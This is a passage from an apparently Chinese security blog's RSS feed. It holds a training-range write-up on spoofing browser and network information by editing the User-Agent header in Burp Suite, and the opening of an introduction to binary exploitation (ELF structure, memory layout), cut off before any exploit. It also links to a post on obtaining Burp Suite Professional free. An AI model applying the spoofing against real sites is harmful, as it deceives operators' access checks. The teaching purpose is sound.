    &gt;https://docs.stack.jimmycai.com/zh/&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Web安全--浏览器信息伪造</title>
        <link>https://kira-pgr.github.io/posts/web1/</link>
        <pubDate>Fri, 28 Jan 2022 22:53:47 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/web1/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/web1/cover.jpg" alt="Featured image of post Web安全--浏览器信息伪造" /&gt;&lt;h1 id=&#34;web安全----浏览器信息伪造&#34;&gt;Web安全&amp;mdash;-浏览器信息伪造&lt;/h1&gt;
&lt;p&gt;&amp;ldquo;诶。。。PGR酱你用的什么浏览器&amp;rdquo;&lt;/p&gt;
&lt;p&gt;— &lt;strong&gt;MimiKs-Sec-Browser.QwQ.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;啊= =哪有这种浏览器&amp;rdquo;&lt;/p&gt;
&lt;p&gt;— 诶嘿嘿，我就有这样神奇的浏览器XD&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 220; 
			flex-basis: 529px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/web1/b.png&#34; data-size=&#34;355x161&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/web1/b.png&#34;
			width=&#34;355&#34;
			height=&#34;161&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/web1/b_hu3234880e455363fbc08a61a3a9ec58d7_7962_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/web1/b_hu3234880e455363fbc08a61a3a9ec58d7_7962_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;诶嘿嘿，有图片作证哦qaq&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;诶嘿嘿，有图片作证哦qaq&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;如何拥有神奇的浏览器&#34;&gt;如何拥有神奇的浏览器;)&lt;/h2&gt;
&lt;p&gt;咳咳咳，进入正题&lt;/p&gt;
&lt;p&gt;要实现以上的效果，就要用到&lt;strong&gt;浏览器信息伪造技术&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;浏览器信息伪造的实现&#34;&gt;浏览器信息伪造的实现&lt;/h2&gt;
&lt;p&gt;网站判断你的设备和浏览器信息主要是依据你发向网站的数据包&lt;/p&gt;
&lt;p&gt;所以我们通过修改数据包实现浏览器信息伪造awa&lt;/p&gt;
&lt;h2 id=&#34;burp-suite抓包&#34;&gt;Burp Suite抓包&lt;/h2&gt;
&lt;p&gt;想要修改数据包，我们必须先抓获它&lt;/p&gt;
&lt;p&gt;&lt;del&gt;(刚从野外抓到一只野生数据包)&lt;/del&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;抓包工具推荐&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 208; 
			flex-basis: 501px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/web1/burp.png&#34; data-size=&#34;1668x799&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/web1/burp.png&#34;
			width=&#34;1668&#34;
			height=&#34;799&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/web1/burp_hu8a74becd61013693fc66c7c5802277f5_197339_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/web1/burp_hu8a74becd61013693fc66c7c5802277f5_197339_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Burp Suite&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Burp Suite&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Burp Suite的大概原理：&lt;/p&gt;
&lt;p&gt;burp类似于代理服务器，&amp;ldquo;拦&amp;quot;你的浏览器和服务器之间，能够发现，拦截过往的数据包&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;Update: 本文章图片里用的是Burp Suite 社区免费版，如需要免费获取专业版，可以参考我的另一篇&lt;a class=&#34;link&#34; href=&#34;https://kira-pgr.github.io/posts/burppro/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;文章&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;切到Proxy(代理)的标签页，打开burp内置浏览器，打开intercept(中断拦截)开关，就可以愉快地开始抓包了qaq&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以ip查询网站ip.chinaz.com为例&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;抓到的数据包&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;GET / HTTP/1.1
Host: ip.chinaz.com
Cookie: qHistory=aHR0cDovL2lwLmNoaW5hei5jb21fSVAvSVB2Nuafpeivou+8jOacjeWKoeWZqOWcsOWdgOafpeivog==; cz_statistics_visitor=6e92e1cd-3bd8-6ec0-9e75-271a4c8dfe89; UM_distinctid=17e9ad54d9ea91-0de9b86d1a8b15-f791b31-e1000-17e9ad54d9faa3; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1643278444,1643280347,1643281459,1643430361; CNZZDATA5082706=cnzz_eid%3D1961137514-1643271376-%26ntime%3D1643422648; SECKEY_ABVK=d8C9ZBZRX6Qya0VNufaZozKriQgZkNE9wBJvCc1YVMo%3D; BMAP_SECKEY=ZvL10u-tISavTuXtRnLwuMF6SZ4DS3InrGol25-dIiWXTBfvmHf1rOql24bKE6-K7ExBo1yo-mlyN-y7jnL9aasP3q6E4R0onZG-ZZW_unKjL13-oBTm8QkEMlFdp3r8C7gTLnuhcWNYDIBVi6s_AOD-H2CjUVKCvfGq6TnZPfxkHkBk2xyM8n1R0E_onq6F
Sec-Ch-Ua: &amp;#34;Chromium&amp;#34;;v=&amp;#34;97&amp;#34;, &amp;#34; Not;A Brand&amp;#34;;v=&amp;#34;99&amp;#34;
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: &amp;#34;Windows&amp;#34;
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;数据包修改实现伪造浏览器信息&#34;&gt;数据包修改实现伪造浏览器信息&lt;/h2&gt;
&lt;p&gt;现在看向这一行数据&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;它包含了你的浏览器/网络信息&lt;/p&gt;
&lt;p&gt;所以我们只需对它进行修改并Forward(放行)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;小Tip:&lt;/p&gt;
&lt;p&gt;Burp抓到的包可以Forward(放行)&lt;/p&gt;
&lt;p&gt;也可以Drop(丢弃)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;User-Agent: MimiKs-Sec_Browser.QwQ.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;靶场实战&#34;&gt;靶场实战&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;靶场地址:
&lt;a class=&#34;link&#34; href=&#34;https://www.mozhe.cn/bug/detail/akpiNHpzUGtObW53Z2hSRUY3WU9lZz09bW96aGUmozhe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;浏览器信息伪造_网络安全_在线靶场_墨者学院_专注于网络安全人才培养&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先分析一下这个网站&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 262; 
			flex-basis: 630px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/web1/site.png&#34; data-size=&#34;1914x729&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/web1/site.png&#34;
			width=&#34;1914&#34;
			height=&#34;729&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/web1/site_hu05da5692f86aaaf2e46f0baa09415d63_219739_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/web1/site_hu05da5692f86aaaf2e46f0baa09415d63_219739_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;网站&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;网站&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;好家伙，这网站叫我们用iPhone手机，并在2G环境下访问（&lt;/p&gt;
&lt;p&gt;&lt;del&gt;&lt;strong&gt;(这不明显是欠揍嘛= =)&lt;/strong&gt;&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;很显然，这在正常情况下不大可能，现在的iPhone手机大多是4G/5G的&lt;/p&gt;
&lt;p&gt;那么我们就用&amp;quot;不正常&amp;quot;的方式去访问它&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意:根据页面提示,抓包分析除了判断浏览器类型还判断了微信特有的NetType&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 222; 
			flex-basis: 534px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/web1/img.png&#34; data-size=&#34;1435x644&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/web1/img.png&#34;
			width=&#34;1435&#34;
			height=&#34;644&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/web1/img_hu2f279f03c9089f87b9cc1f801e632b5e_147828_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/web1/img_hu2f279f03c9089f87b9cc1f801e632b5e_147828_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;抓到的数据包&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;抓到的数据包&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;将&lt;strong&gt;User-Agent&lt;/strong&gt;改为:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;小Tip:可以上网查询相关设备User-Agent长什么样子&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;成功获取flag&lt;/p&gt;
&lt;p&gt;(flag这里不放了，自己去可以去VAN)&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;the-end&#34;&gt;The END&lt;/h2&gt;
</description>
        </item>
        <item>
        <title>PWN! PWN! PANG! Part1---基础知识</title>
        <link>https://kira-pgr.github.io/posts/pwn1/</link>
        <pubDate>Thu, 27 Jan 2022 21:24:46 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/pwn1/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/pwn1/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part1---基础知识" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part1&#34;&gt;PWN! PWN! PANG! Part1&lt;/h1&gt;
&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
&lt;p&gt;这里是PGR的PWN基础学习笔记qaq，主要研究的是Linux下ELF可执行文件的漏洞利用&lt;/p&gt;
&lt;p&gt;涉及内容:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;栈(Stack)的漏洞利用，主要是栈溢出(Stack Overflow)攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;PS: 说到Stack Overflow就必须得说一个同名的国外著名IT论坛(真的&lt;strong&gt;特别特别特别&lt;/strong&gt;好用)&lt;/p&gt;
&lt;p&gt;重要的事情说三遍哈XD&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://stackoverflow.com/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;C语言Printf()函数格式化字符串漏洞(Format String)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一小点堆(Heap)利用&lt;/p&gt;
&lt;hr&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;AND: 文章中涉及的题目文件会全部随文章发出来&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;如果各位不想一个一个下载的话，这边有一个环境搭好(工具+题目)的Xubuntu Linux(VMware虚拟机)&lt;/p&gt;
&lt;p&gt;链接如下:&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;blur&#34;&gt;mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Efyh9fLtgIZCi2Q21hCXLI0BFrHp17qc9ZxHW6mjovmSBw?e=BUtZzA&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;如果想只下载题目的话:&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;blur&#34;&gt;mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Eefb6Yqp7vpGriwwFz6wQCkBtjqcFnGZwZTAyK2fJhA_FA?e=gjHVUW&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;什么是pwn&#34;&gt;什么是PWN?&lt;/h2&gt;
&lt;p&gt;PWN原指黑客攻破系统发出的“砰”的响声，在这里我们解释为&lt;strong&gt;二进制漏洞挖掘与利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;分步来讲的话 = = 大概可以概括为以下几点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;破解、利用成功（程序的二进制漏洞）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;攻破（设备、服务器）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;控制（设备、服务器）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 153; 
			flex-basis: 368px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn1/pwn.jpg&#34; data-size=&#34;316x206&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn1/pwn.jpg&#34;
			width=&#34;316&#34;
			height=&#34;206&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn1/pwn_hu128b26d5dee886e0836026592cbb57e4_14642_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/pwn1/pwn_hu128b26d5dee886e0836026592cbb57e4_14642_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;配个图&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;配个图&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;linux下elf文件&#34;&gt;Linux下ELF文件&lt;/h2&gt;
&lt;p&gt;ELF文件的是Linux下的可执行文件，与Windows下exe文件不同&lt;/p&gt;
&lt;p&gt;可以用File命令查看你的文件格式:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 174; 
			flex-basis: 417px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn1/file.png&#34; data-size=&#34;1139x654&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn1/file.png&#34;
			width=&#34;1139&#34;
			height=&#34;654&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn1/file_hu1761c43f1feaec7dd67d54f7494ee724_547395_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn1/file_hu1761c43f1feaec7dd67d54f7494ee724_547395_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;File命令&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;File命令&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不过这里有一个很有趣的地方，由于File命令依据文件头判断文件类型，Linux的后缀名并不影响File命令判断文件是ELF文件(即使a.out已经变成了a.zip)&lt;/p&gt;
&lt;p&gt;不过在文件夹窗口里双击这个.zip, 就会发现:这个ELF文件已经被当成压缩包打开   (这和win似乎很像)&lt;/p&gt;
&lt;p&gt;可见在修改后缀名的过程中，干扰了系统对于文件打开方式的识别= =&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 150; 
			flex-basis: 361px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn1/file1.png&#34; data-size=&#34;945x627&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn1/file1.png&#34;
			width=&#34;945&#34;
			height=&#34;627&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn1/file1_hu875359da3f79d0c44f12bd1a55586189_97232_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn1/file1_hu875359da3f79d0c44f12bd1a55586189_97232_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;嘿嘿= =, 被迷惑了呢;)&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;嘿嘿= =, 被迷惑了呢;)&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;elf文件的结构&#34;&gt;ELF文件的结构&lt;/h2&gt;
&lt;p&gt;咳咳，貌似扯远了=   =&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 190; 
			flex-basis: 456px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn1/ELF.jpg&#34; data-size=&#34;1363x716&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn1/ELF.jpg&#34;
			width=&#34;1363&#34;
			height=&#34;716&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn1/ELF_hu0ce4d14d1fe8e283ae7ea71aea35f162_138178_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/pwn1/ELF_hu0ce4d14d1fe8e283ae7ea71aea35f162_138178_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;ELF文件结构&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;ELF文件结构&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;现在我们再重新审视一下&amp;quot;a.out&amp;quot;这个可执行文件&lt;/p&gt;
&lt;p&gt;我们刚刚一不小心把它用压缩包的方式打开(如上图)&lt;/p&gt;
&lt;p&gt;我们看到一堆奇怪的文件:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;.got&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;.got.plt&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;.plt&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;.text&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&amp;hellip;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些文件实际上代表着这个ELF文件在磁盘里的 一个个 &lt;strong&gt;&amp;ldquo;节&amp;rdquo;(Section)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;而当ELF被映射进内存中的时候， 就有了&lt;strong&gt;段(Segment)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 192; 
			flex-basis: 461px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn1/ELF1.jpg&#34; data-size=&#34;1351x703&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn1/ELF1.jpg&#34;
			width=&#34;1351&#34;
			height=&#34;703&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn1/ELF1_hu72f2ee80ba7d32b6199946b7d38aa6e6_72517_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/pwn1/ELF1_hu72f2ee80ba7d32b6199946b7d38aa6e6_72517_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;节与段&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;节与段&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;段与节&#34;&gt;段与节&lt;/h2&gt;
&lt;p&gt;在这里再详细扯一点段与节的东西&lt;/p&gt;
&lt;p&gt;(嘛 =    =， 因为我个人学的时候感觉这块知识对于后面影响挺大的)&lt;/p&gt;
&lt;p&gt;先扯一下: 段是比节大的qaq&lt;/p&gt;
&lt;p&gt;这里来一个非常非常经典且重要的图,有请:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 189; 
			flex-basis: 454px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn1/img.png&#34; data-size=&#34;1359x717&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn1/img.png&#34;
			width=&#34;1359&#34;
			height=&#34;717&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn1/img_hu25854d26341c86fdce4489a656418346_70073_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn1/img_hu25854d26341c86fdce4489a656418346_70073_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;非常非常经典且重要的图 PS: 还是QQ截图清楚  别打了别打了）&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;非常非常经典且重要的图 PS: 还是QQ截图清楚  别打了别打了）&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;从这张图我们可以看到，.data .bss .got.plt节都被映射到了&lt;strong&gt;Data(数据)段&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;而.rodata .text .init ELF Header被映射到了&lt;strong&gt;Code(代码)段&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这是为什么呢?&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;前三个节 &lt;del&gt;(懒得仔细写了)&lt;/del&gt; 有一个共同的特征:可读可写。因为用户数据是要保存在这里的，如果它不可写的话，显然不彳亍=  = 。 很显然，你也不能让它可执行，这样用户就可以写入任意数据并执行了(永远不要相信用户的输入是安全的)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;后四个节是代码部分，往往是小程序自己的一些东西，所以他是可读可执行，但不可以写=   =&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最后, &amp;gt;__&amp;lt;, 再来个图;)&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 187; 
			flex-basis: 450px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn1/img1.png&#34; data-size=&#34;1350x719&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn1/img1.png&#34;
			width=&#34;1350&#34;
			height=&#34;719&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn1/img1_huc654210b42dc0202bb596523623c9d4c_100907_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn1/img1_huc654210b42dc0202bb596523623c9d4c_100907_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;有关部分节的作用&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;有关部分节的作用&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;程序数据在内存中的组织&#34;&gt;程序数据在内存中的组织&lt;/h2&gt;
&lt;p&gt;废话不说，直接上图()&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 190; 
			flex-basis: 457px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn1/mem.png&#34; data-size=&#34;1355x711&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn1/mem.png&#34;
			width=&#34;1355&#34;
			height=&#34;711&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn1/mem_huae9965f5cba59206b56105b8aa15edc0_63508_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn1/mem_huae9965f5cba59206b56105b8aa15edc0_63508_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;程序数据在内存中的组织&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;程序数据在内存中的组织&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;咳咳，在这里默认大家有一点的c基础&lt;/p&gt;
&lt;p&gt;不再扯开讲了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;这里要注意的几点就是&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;栈是&lt;del&gt;向下&lt;/del&gt;从高地址向低地址增长的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;堆是从低地址向高地址增长&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据是从低地址向高地址写入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;BSS保存全局变量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;栈保存局部变量&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;关于汇编罪恶的汇编--&#34;&gt;关于汇编，罪恶的汇编=  =&lt;/h2&gt;
&lt;p&gt;汇编的话，只需要知道最最最基础的一些指令=  =&lt;/p&gt;
&lt;p&gt;既然都写了这么长了嘛=   =&lt;/p&gt;
&lt;p&gt;那就继续下去好了。。咳咳。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;一些常用汇编指令&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 190; 
			flex-basis: 457px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn1/asm.png&#34; data-size=&#34;1354x711&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn1/asm.png&#34;
			width=&#34;1354&#34;
			height=&#34;711&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn1/asm_hudd3b919f86ee6bd3673bb8c9e0238d19_36486_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn1/asm_hudd3b919f86ee6bd3673bb8c9e0238d19_36486_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;常用汇编指令&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;常用汇编指令&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;用法&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
